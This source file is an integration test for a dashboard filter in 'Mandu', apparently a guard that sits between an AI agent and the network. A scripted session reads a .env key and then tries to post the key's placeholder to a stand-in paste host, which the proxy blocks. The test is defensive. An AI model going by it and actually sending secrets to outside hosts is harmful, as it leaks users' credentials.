/**
 * agent-only-stepped-in — a session's page shows only the turns where
 * Mandu stepped in, across the REAL components (dashboard.md §4.25ae *Only
 * where Mandu stepped in*). Mandu-new.
 *
 * A session's page drew every turn as a full card, though most of a real
 * session is ordinary work where Mandu did nothing. Here a real
 * ArbiterServer runs at the `secrets` axes, the REAL anthropic-proxy on its
 * production client (`new ArbiterClientAdapter(data, human)`) carries one
 * session of seven turns: ordinary reads of a notes file, one turn that
 * reads a `.env` whose key the proxy masks, and one in which the agent's
 * program sends the key's placeholder to a host no rule binds it to through
 * the REAL net-proxy on its production client, which blocks it and holds it
 * for an OK. A real DashboardServer over the production adapter
 * (`makeApprovalsArbiter`) serves the session's page:
 *
 *   S1  the served record: of the seven turns, exactly the `.env` turn and
 *       the send's turn are ones where Mandu stepped in (their tone), the
 *       others plain;
 *   S2  the served page opened with `?only=stepped-in`: the switch on and
 *       counting "2 of 7 turns", exactly those two turns in sight, each run
 *       of the others one line in its place ("2 turns where Mandu did
 *       nothing", …); a line's button brings its turns back in place; the
 *       switch turned off shows every turn;
 *   S3  the oracle: the model never got the `.env` value, and no answer or
 *       drawn page carries it, nor a token (`$MDU`) on the product side.
 *
 * Axes: secrets (stated; the arbiter's confidentiality pinned ON). What is
 * under test is the served page; the stack supplies the real session and
 * what the server says each turn did.
 */
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { Readable } from "node:stream";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { resetCurrentPolicyForTests } from "../../arbiter/policy/compiled-policy.js";
import { AnthropicProxy, type UpstreamFetcher } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { buildTextSse, buildToolUseSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter as NetArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { makeApprovalsArbiter } from "../../dashboard/src/arbiter-adapter.js";
import type { AgentPageVM } from "../../dashboard/src/view-model/agent-page.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

after(() => resetCurrentPolicyForTests("claude-code"));

const SESSION = `1791840000-${process.pid}`;
const VALUE = `sk_live_onlySteppedIn_${process.pid}_000000`;
const render = (s: string) => s.split("\n").slice(0, -1).map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join("\n") + "\n";
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type El = any;

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

/** The seven questions, in order; `env` reads the .env, `send` is the turn
 *  whose program sends the key, `talk` has no step at all. */
const TURNS = [
  { q: "List what is in notes.txt", kind: "read" },
  { q: "Read notes.txt again", kind: "read" },
  { q: "What is in .env?", kind: "env" },
  { q: "Summarize notes.txt", kind: "read" },
  { q: "Post the key to the paste site", kind: "send" },
  { q: "Thanks, that is all for now", kind: "talk" },
  { q: "One last look at notes.txt", kind: "read" },
] as const;

test("a session's page with the switch on shows exactly the turns where Mandu stepped in, on the real stack, and no value is shown (secrets axes, explicit)", { timeout: 120_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-only-stepped-in-"));
  const ws = join(tmp, "ws");
  mkdirSync(ws, { recursive: true });
  const notes = join(ws, "notes.txt");
  const env = join(ws, ".env");
  writeFileSync(notes, "Buy milk.\nShip the parser.\n");
  writeFileSync(env, `STRIPE_KEY=${VALUE}\n`);
  const policyPath = join(tmp, "policy.yaml");
  writeFileSync(policyPath, `version: 1\npaths:\n  - path: ${join(tmp, "other.key")}\n    level: no-model\n`);
  const sock = join(tmp, "arbiter.sock");
  const adminSock = join(tmp, "admin.sock");
  const humanSock = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const arbiter = new ArbiterServer({
    socketPath: sock, adminSocketPath: adminSock, humanSocketPath: humanSock, dbPath: join(tmp, "mandu.db"), eventDir: join(tmp, "events"),
    policyPath, policyPollMs: 0, log: () => {}, confidentiality: true, integrity: false,
  });
  await arbiter.listen();
  const data = new ArbiterClient(sock); await data.connect();
  const human = new ArbiterClient(humanSock); await human.connect();
  const wired = await makeApprovalsArbiter(sock, () => ({ socketPath: adminSock }));
  assert.ok(wired, "the production wiring");
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath: sock, humanSocketPath: humanSock }),
    approvalsArbiter: wired.arbiter, secretsArbiter: wired.secrets, policyDocArbiter: wired.policyDoc,
    configEnv: { MANDU_HOME: join(tmp, "home") }, log: () => {},
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  // The scripted model answers each request with the next of `replies`.
  const replies: string[] = [];
  const seen: string[] = [];
  const upstream: UpstreamFetcher = async ({ body }) => {
    seen.push(body.toString("utf8"));
    const sse = replies.shift() ?? buildTextSse("Done.", { deltas: 1 });
    return { status: 200, headers: { "content-type": "text/event-stream" }, body: Readable.from([Buffer.from(sse, "utf8")]) };
  };
  const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(data, human), upstream, sessionKey: SESSION, log: () => {} });
  const port = await proxy.listen(0);
  // The net-proxy as production wires it (net-proxy/src/server-main.ts).
  const forwarded: string[] = [];
  const net = new NetProxy({
    arbiter: new NetArbiterClientAdapter(data as unknown as RealArbiterClient, human),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a blocked send must never be forwarded");
    },
    log: () => {},
  });
  const netPort = await net.listen(0);
  type Msg = { role: string; content: unknown };
  const ask = async (messages: Msg[], reply: string): Promise<string> => {
    replies.push(reply);
    const res = await pageFetch(`http://127.0.0.1:${port}/v1/messages`, {
      method: "POST",
      headers: { "content-type": "application/json", "x-mandu-session-id": SESSION, "anthropic-version": "2023-06-01" },
      body: JSON.stringify({ model: "claude-opus-4", stream: true, max_tokens: 512, tools: [{ name: "Read", input_schema: { type: "object" } }], messages }),
    });
    assert.equal(res.status, 200, await res.text());
    return seen.at(-1)!;
  };
  const noValue = (text: string, where: string) => {
    assert.ok(!text.includes(VALUE), `CONFIDENTIALITY VIOLATION: ${where} carries the .env value`);
    assert.doesNotMatch(text, /\$MDU/, `${where} carries a token`);
  };
  const getPage = async (): Promise<{ text: string; vm: AgentPageVM }> => {
    const r = await pageFetch(`${base}/api/home/agent?session=${SESSION}`);
    assert.equal(r.status, 200);
    const text = await r.text();
    return { text, vm: JSON.parse(text) as AgentPageVM };
  };
  try {
    // ── The session: seven turns, one request a step ──
    let history: Msg[] = [];
    let symbol: string | undefined;
    for (const [i, t] of TURNS.entries()) {
      const q: Msg[] = [...history, { role: "user", content: t.q }];
      if (t.kind === "talk") {
        await ask(q, buildTextSse("You are welcome.", { deltas: 1 }));
        history = [...q, { role: "assistant", content: "You are welcome." }];
        continue;
      }
      if (t.kind === "send") {
        await ask(q, buildTextSse("Posting it now.", { deltas: 1 }));
        await new Promise((r) => setTimeout(r, 20)); // the send comes strictly inside this turn
        // The agent's program sends the key to a host no rule binds it to: blocked, held for an OK.
        const res = await viaProxy(netPort, "http://paste.only.example/collect", `d=${symbol}`);
        assert.equal(res.status, 403, "the real net-proxy blocks an unbound send");
        assert.ok(!res.body.includes(VALUE));
        assert.deepEqual(forwarded, [], "nothing left the machine");
        await new Promise((r) => setTimeout(r, 20));
        history = [...q, { role: "assistant", content: "Posting it now." }];
        continue;
      }
      const file = t.kind === "env" ? env : notes;
      const id = `toolu_only_${i}`;
      await ask(q, buildToolUseSse({ id, name: "Read", input: { file_path: file } }));
      const withResult: Msg[] = [
        ...q,
        { role: "assistant", content: [{ type: "tool_use", id, name: "Read", input: { file_path: file } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: render(t.kind === "env" ? `STRIPE_KEY=${VALUE}\n` : "Buy milk.\nShip the parser.\n") }] },
      ];
      const got = await ask(withResult, buildTextSse("Done.", { deltas: 1 }));
      if (t.kind === "env") {
        assert.ok(!got.includes(VALUE), "CONFIDENTIALITY VIOLATION: the model got the .env value");
        symbol = /\$MDU:[A-Za-z]+_Read\[[0-9a-f]+\](?:\.[A-Z_]+)?/.exec(got)?.[0];
        assert.ok(symbol, "the model got the key's placeholder");
      }
      history = [...withResult, { role: "assistant", content: "Done." }];
      await new Promise((r) => setTimeout(r, 5));
    }

    // ── S1: the served record ──
    let page = await getPage();
    const settled = (vm: AgentPageVM) => vm.story.length === TURNS.length && vm.story.filter((t) => t.tone !== "plain").length === 2;
    for (let i = 0; i < 200 && !settled(page.vm); i++) {
      await new Promise((r) => setTimeout(r, 25));
      page = await getPage();
    }
    assert.deepEqual(page.vm.story.map((t) => t.prompt), TURNS.map((t) => t.q), "the seven turns, in order");
    const stepped = page.vm.story.filter((t) => t.tone !== "plain" || t.promptNote).map((t) => t.prompt);
    assert.deepEqual(stepped, ["What is in .env?", "Post the key to the paste site"], `exactly the mask and the send: ${JSON.stringify(page.vm.story.map((t) => [t.prompt, t.tone, t.summary]))}`);
    noValue(page.text, "/api/home/agent");
    const ids = page.vm.story.map((t) => t.id);

    // ── S2: the served page, opened filtered ──
    const shown = (doc: El) => ([...doc.querySelectorAll("#agent-story article.turn[data-turn-id]")] as El[]).filter((t) => !t.closest("[hidden]")).map((t) => t.dataset.turnId);
    const lines = (doc: El) => [...doc.querySelectorAll("#agent-story .story-quiet")] as El[];
    await servedProductPage(base, `/agents/${SESSION}?only=stepped-in`, (doc) => lines(doc).length === 3, (doc) => {
      const sw = doc.getElementById("agent-only");
      assert.equal(doc.getElementById("agent-only-row").hidden, false);
      assert.equal(sw.getAttribute("aria-checked"), "true", "the address opened it on");
      assert.equal(doc.getElementById("agent-only-words").textContent, "Only where Mandu stepped in (2 of 7 turns)");
      assert.deepEqual(shown(doc), [ids[2], ids[4]], "exactly the turn with the mask and the turn with the send");
      assert.deepEqual(lines(doc).map((l) => l.querySelector("span").textContent), [
        "2 turns where Mandu did nothing", "1 turn where Mandu did nothing", "2 turns where Mandu did nothing",
      ]);
      assert.deepEqual(lines(doc).map((l) => l.dataset.quietFrom), [ids[0], ids[3], ids[5]], "each line in its run's place");
      noValue(doc.getElementById("agent-story").textContent, "the drawn story");
      // A line's button brings its turns back, in place.
      const btn = lines(doc)[2].querySelector("button.quiet-toggle");
      btn.click();
      assert.equal(btn.getAttribute("aria-expanded"), "true");
      assert.deepEqual(shown(doc), [ids[2], ids[4], ids[5], ids[6]]);
      lines(doc)[0].querySelector("button.quiet-toggle").click();
      assert.deepEqual(shown(doc), [ids[0], ids[1], ids[2], ids[4], ids[5], ids[6]]);
      // Off: every turn, no line, and the address without it.
      sw.click();
      assert.equal(sw.getAttribute("aria-checked"), "false");
      assert.deepEqual(shown(doc), ids);
      assert.equal(lines(doc).length, 0);
      assert.equal(doc.defaultView.location.search, "");
      noValue(doc.body.textContent, "the rendered session page");
    });

    // ── S3: the oracle ──
    assert.ok(!seen.join("\n").includes(VALUE), "CONFIDENTIALITY VIOLATION: the model got the .env value");
    for (const route of ["/api/home", "/api/home/history", `/api/home/agent?session=${SESSION}`]) {
      noValue(await (await pageFetch(base + route)).text(), route);
    }
  } finally {
    await proxy.close();
    await net.close();
    await dashboard.close();
    wired?.close();
    data.close();
    human.close();
    await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
